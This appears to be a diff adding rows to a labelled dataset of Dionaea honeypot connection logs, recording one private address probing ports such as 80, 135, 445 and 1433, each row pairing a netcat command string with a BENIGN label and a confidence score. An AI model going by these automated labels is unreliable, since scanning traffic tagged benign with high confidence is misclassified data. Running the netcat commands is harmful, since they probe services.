+dionaea,connection,2026-02-21T09:52:27.398891,100.65.39.23,172.17.0.2,63120,1433,nc 100.65.39.23 1433,attack_logs.json,140,BENIGN,0.989143,1,mssqld
+dionaea,connection,2026-02-21T09:52:29.155997,100.65.39.23,172.17.0.2,63202,80,nc 100.65.39.23 80,attack_logs.json,141,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:29.931737,100.65.39.23,172.17.0.2,63285,5060,nc 100.65.39.23 5060,attack_logs.json,142,BENIGN,0.989756,1,SipSession
+dionaea,connection,2026-02-21T09:52:31.385900,100.65.39.23,172.17.0.2,63337,80,nc 100.65.39.23 80,attack_logs.json,143,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:33.573702,100.65.39.23,172.17.0.2,63542,80,nc 100.65.39.23 80,attack_logs.json,144,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:34.834405,100.65.39.23,172.17.0.2,63686,80,nc 100.65.39.23 80,attack_logs.json,145,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:36.220834,100.65.39.23,172.17.0.2,63883,80,nc 100.65.39.23 80,attack_logs.json,146,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:37.485719,100.65.39.23,172.17.0.2,64147,80,nc 100.65.39.23 80,attack_logs.json,147,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:38.754310,100.65.39.23,172.17.0.2,64438,80,nc 100.65.39.23 80,attack_logs.json,148,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:40.121423,100.65.39.23,172.17.0.2,64772,80,nc 100.65.39.23 80,attack_logs.json,149,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:42.359870,100.65.39.23,172.17.0.2,65464,80,nc 100.65.39.23 80,attack_logs.json,150,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:43.226436,100.65.39.23,172.17.0.2,65516,21,nc 100.65.39.23 21,attack_logs.json,151,BENIGN,0.986564,1,ftpd
+dionaea,connection,2026-02-21T09:52:43.396319,100.65.39.23,172.17.0.2,65526,3306,nc 100.65.39.23 3306,attack_logs.json,152,BENIGN,0.986372,1,mysqld
+dionaea,connection,2026-02-21T09:52:43.332677,100.65.39.23,172.17.0.2,42,39371,nc 100.65.39.23 39371,attack_logs.json,153,BENIGN,0.984295,1,mirrorc
+dionaea,connection,2026-02-21T09:52:43.351452,100.65.39.23,172.17.0.2,65518,42,nc 100.65.39.23 42,attack_logs.json,154,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:52:43.313573,100.65.39.23,172.17.0.2,65519,80,nc 100.65.39.23 80,attack_logs.json,155,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:52:43.380406,100.65.39.23,172.17.0.2,65527,5060,nc 100.65.39.23 5060,attack_logs.json,156,BENIGN,0.989756,1,SipSession
+dionaea,connection,2026-02-21T09:52:43.282172,100.65.39.23,172.17.0.2,65522,445,nc 100.65.39.23 445,attack_logs.json,157,BENIGN,0.988592,1,smbd
+dionaea,connection,2026-02-21T09:52:48.261291,100.65.39.23,172.17.0.2,42,41075,nc 100.65.39.23 41075,attack_logs.json,158,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:52:48.278000,100.65.39.23,172.17.0.2,65529,42,nc 100.65.39.23 42,attack_logs.json,159,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:52:43.296959,100.65.39.23,172.17.0.2,65520,135,nc 100.65.39.23 135,attack_logs.json,160,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:52:43.250168,100.65.39.23,172.17.0.2,65523,1433,nc 100.65.39.23 1433,attack_logs.json,161,BENIGN,0.989143,1,mssqld
+dionaea,connection,2026-02-21T09:52:54.263500,100.65.39.23,172.17.0.2,49153,1433,nc 100.65.39.23 1433,attack_logs.json,162,BENIGN,0.989143,1,mssqld
+dionaea,connection,2026-02-21T09:52:49.363692,100.65.39.23,172.17.0.2,65531,5061,nc 100.65.39.23 5061,attack_logs.json,163,BENIGN,0.98061,1,SipSession
+dionaea,connection,2026-02-21T09:52:49.299321,100.65.39.23,172.17.0.2,65530,443,nc 100.65.39.23 443,attack_logs.json,164,BENIGN,0.982924,1,httpd
+dionaea,connection,2026-02-21T09:52:49.334758,100.65.39.23,172.17.0.2,65532,5060,nc 100.65.39.23 5060,attack_logs.json,165,BENIGN,0.989756,1,SipSession
+dionaea,connection,2026-02-21T09:52:53.272359,100.65.39.23,172.17.0.2,42,34595,nc 100.65.39.23 34595,attack_logs.json,166,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:52:53.348969,100.65.39.23,172.17.0.2,65533,42,nc 100.65.39.23 42,attack_logs.json,167,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:52:54.276390,100.65.39.23,172.17.0.2,49152,135,nc 100.65.39.23 135,attack_logs.json,168,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:52:56.839168,100.65.39.23,172.17.0.2,49155,5060,nc 100.65.39.23 5060,attack_logs.json,169,BENIGN,0.989756,1,SipSession
+dionaea,connection,2026-02-21T09:52:55.345281,100.65.39.23,172.17.0.2,49154,5061,nc 100.65.39.23 5061,attack_logs.json,170,BENIGN,0.98061,1,SipSession
+dionaea,connection,2026-02-21T09:52:58.305888,100.65.39.23,172.17.0.2,42,45783,nc 100.65.39.23 45783,attack_logs.json,171,BENIGN,0.984226,1,mirrorc
+dionaea,connection,2026-02-21T09:52:58.323864,100.65.39.23,172.17.0.2,49156,42,nc 100.65.39.23 42,attack_logs.json,172,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:52:59.274263,100.65.39.23,172.17.0.2,49157,135,nc 100.65.39.23 135,attack_logs.json,173,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:53:02.929205,100.65.39.23,172.17.0.2,49158,5061,nc 100.65.39.23 5061,attack_logs.json,174,BENIGN,0.98061,1,SipSession
+dionaea,connection,2026-02-21T09:53:03.314585,100.65.39.23,172.17.0.2,42,42195,nc 100.65.39.23 42195,attack_logs.json,175,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:53:03.411291,100.65.39.23,172.17.0.2,49159,42,nc 100.65.39.23 42,attack_logs.json,176,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:53:04.292893,100.65.39.23,172.17.0.2,49160,135,nc 100.65.39.23 135,attack_logs.json,177,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:53:08.383527,100.65.39.23,172.17.0.2,42,41989,nc 100.65.39.23 41989,attack_logs.json,178,BENIGN,0.987061,1,mirrorc
+dionaea,connection,2026-02-21T09:53:08.436344,100.65.39.23,172.17.0.2,49161,42,nc 100.65.39.23 42,attack_logs.json,179,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:53:09.305938,100.65.39.23,172.17.0.2,49162,135,nc 100.65.39.23 135,attack_logs.json,180,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:53:13.407576,100.65.39.23,172.17.0.2,42,33091,nc 100.65.39.23 33091,attack_logs.json,181,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:53:13.508184,100.65.39.23,172.17.0.2,49163,42,nc 100.65.39.23 42,attack_logs.json,182,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:53:14.352247,100.65.39.23,172.17.0.2,49164,135,nc 100.65.39.23 135,attack_logs.json,183,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:53:18.428143,100.65.39.23,172.17.0.2,42,43447,nc 100.65.39.23 43447,attack_logs.json,184,BENIGN,0.983035,1,mirrorc
+dionaea,connection,2026-02-21T09:53:18.529139,100.65.39.23,172.17.0.2,55642,42,nc 100.65.39.23 42,attack_logs.json,185,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:53:19.347769,100.65.39.23,172.17.0.2,55643,135,nc 100.65.39.23 135,attack_logs.json,186,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:53:23.502424,100.65.39.23,172.17.0.2,42,38357,nc 100.65.39.23 38357,attack_logs.json,187,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:53:23.554844,100.65.39.23,172.17.0.2,55644,42,nc 100.65.39.23 42,attack_logs.json,188,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:53:24.366161,100.65.39.23,172.17.0.2,55645,135,nc 100.65.39.23 135,attack_logs.json,189,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:53:28.543781,100.65.39.23,172.17.0.2,42,41353,nc 100.65.39.23 41353,attack_logs.json,190,BENIGN,0.983597,1,mirrorc
+dionaea,connection,2026-02-21T09:53:28.615327,100.65.39.23,172.17.0.2,55646,42,nc 100.65.39.23 42,attack_logs.json,191,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:53:29.371493,100.65.39.23,172.17.0.2,55647,135,nc 100.65.39.23 135,attack_logs.json,192,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:53:33.486736,100.65.39.23,172.17.0.2,42,41973,nc 100.65.39.23 41973,attack_logs.json,193,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:53:33.649150,100.65.39.23,172.17.0.2,55648,42,nc 100.65.39.23 42,attack_logs.json,194,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:53:36.875427,100.65.39.23,172.17.0.2,55649,135,nc 100.65.39.23 135,attack_logs.json,195,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:53:38.504005,100.65.39.23,172.17.0.2,42,42485,nc 100.65.39.23 42485,attack_logs.json,196,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:53:38.558044,100.65.39.23,172.17.0.2,55650,42,nc 100.65.39.23 42,attack_logs.json,197,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:53:41.892625,100.65.39.23,172.17.0.2,55651,135,nc 100.65.39.23 135,attack_logs.json,198,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:53:43.522847,100.65.39.23,172.17.0.2,42,34381,nc 100.65.39.23 34381,attack_logs.json,199,BENIGN,0.987482,1,mirrorc
+dionaea,connection,2026-02-21T09:53:43.628356,100.65.39.23,172.17.0.2,55652,42,nc 100.65.39.23 42,attack_logs.json,200,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:53:46.913054,100.65.39.23,172.17.0.2,55653,135,nc 100.65.39.23 135,attack_logs.json,201,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:53:48.526188,100.65.39.23,172.17.0.2,42,44587,nc 100.65.39.23 44587,attack_logs.json,202,BENIGN,0.984351,1,mirrorc
+dionaea,connection,2026-02-21T09:53:48.564499,100.65.39.23,172.17.0.2,55654,42,nc 100.65.39.23 42,attack_logs.json,203,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:53:51.922927,100.65.39.23,172.17.0.2,55655,135,nc 100.65.39.23 135,attack_logs.json,204,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:53:56.932800,100.65.39.23,172.17.0.2,55657,135,nc 100.65.39.23 135,attack_logs.json,205,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:53:53.537908,100.65.39.23,172.17.0.2,42,32773,nc 100.65.39.23 32773,attack_logs.json,206,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:53:53.626114,100.65.39.23,172.17.0.2,55656,42,nc 100.65.39.23 42,attack_logs.json,207,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:53:57.008340,100.65.39.23,172.17.0.2,55658,135,nc 100.65.39.23 135,attack_logs.json,208,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:53:58.540754,100.65.39.23,172.17.0.2,42,41171,nc 100.65.39.23 41171,attack_logs.json,209,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:53:58.584825,100.65.39.23,172.17.0.2,55659,42,nc 100.65.39.23 42,attack_logs.json,210,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:54:02.009595,100.65.39.23,172.17.0.2,55660,135,nc 100.65.39.23 135,attack_logs.json,211,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:54:03.551980,100.65.39.23,172.17.0.2,42,36845,nc 100.65.39.23 36845,attack_logs.json,212,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:54:03.642076,100.65.39.23,172.17.0.2,55661,42,nc 100.65.39.23 42,attack_logs.json,213,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:54:07.017497,100.65.39.23,172.17.0.2,55662,135,nc 100.65.39.23 135,attack_logs.json,214,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:54:08.562478,100.65.39.23,172.17.0.2,42,40703,nc 100.65.39.23 40703,attack_logs.json,215,BENIGN,0.9884,1,mirrorc
+dionaea,connection,2026-02-21T09:54:08.647610,100.65.39.23,172.17.0.2,55663,42,nc 100.65.39.23 42,attack_logs.json,216,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:54:12.013179,100.65.39.23,172.17.0.2,55664,135,nc 100.65.39.23 135,attack_logs.json,217,BENIGN,0.990375,1,epmapper
+dionaea,connection,2026-02-21T09:54:13.553452,100.65.39.23,172.17.0.2,42,41047,nc 100.65.39.23 41047,attack_logs.json,218,BENIGN,0.984239,1,mirrorc
+dionaea,connection,2026-02-21T09:54:13.629116,100.65.39.23,172.17.0.2,55665,42,nc 100.65.39.23 42,attack_logs.json,219,BENIGN,0.989041,1,mirrord
+dionaea,connection,2026-02-21T09:54:30.480664,100.65.39.23,172.17.0.2,55667,80,nc 100.65.39.23 80,attack_logs.json,220,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:54:30.532406,100.65.39.23,172.17.0.2,55671,80,nc 100.65.39.23 80,attack_logs.json,221,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:54:30.637104,100.65.39.23,172.17.0.2,55673,80,nc 100.65.39.23 80,attack_logs.json,222,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:54:36.673265,100.65.39.23,172.17.0.2,55675,443,nc 100.65.39.23 443,attack_logs.json,223,BENIGN,0.982924,1,httpd
+dionaea,connection,2026-02-21T09:54:42.831930,100.65.39.23,172.17.0.2,55682,80,nc 100.65.39.23 80,attack_logs.json,224,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:54:42.790152,100.65.39.23,172.17.0.2,55681,80,nc 100.65.39.23 80,attack_logs.json,225,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:54:42.760733,100.65.39.23,172.17.0.2,55679,80,nc 100.65.39.23 80,attack_logs.json,226,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:54:42.878565,100.65.39.23,172.17.0.2,55678,443,nc 100.65.39.23 443,attack_logs.json,227,BENIGN,0.982924,1,httpd
+dionaea,connection,2026-02-21T09:54:42.933742,100.65.39.23,172.17.0.2,55680,443,nc 100.65.39.23 443,attack_logs.json,228,BENIGN,0.982924,1,httpd
+dionaea,connection,2026-02-21T09:54:42.989134,100.65.39.23,172.17.0.2,55683,80,nc 100.65.39.23 80,attack_logs.json,229,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:54:43.066049,100.65.39.23,172.17.0.2,55686,80,nc 100.65.39.23 80,attack_logs.json,230,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:54:43.029780,100.65.39.23,172.17.0.2,55684,443,nc 100.65.39.23 443,attack_logs.json,231,BENIGN,0.982924,1,httpd
+dionaea,connection,2026-02-21T09:54:43.109340,100.65.39.23,172.17.0.2,55685,443,nc 100.65.39.23 443,attack_logs.json,232,BENIGN,0.982924,1,httpd
+dionaea,connection,2026-02-21T09:54:43.176953,100.65.39.23,172.17.0.2,55687,80,nc 100.65.39.23 80,attack_logs.json,233,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:54:43.475356,100.65.39.23,172.17.0.2,55689,80,nc 100.65.39.23 80,attack_logs.json,234,BENIGN,0.802364,1,httpd
+dionaea,connection,2026-02-21T09:54:43.441581,100.65.39.23,172.17.0.2,55688,443,nc 100.65.39.23 443,attack_logs.json,235,BENIGN,0.982924,1,httpd
+dionaea,connection,2026-02-21T09:54:43.551772,100.65.39.23,172.17.0.2,55690,443,nc 100.65.39.23 443,attack_logs.json,236,BENIGN,0.982924,1,httpd
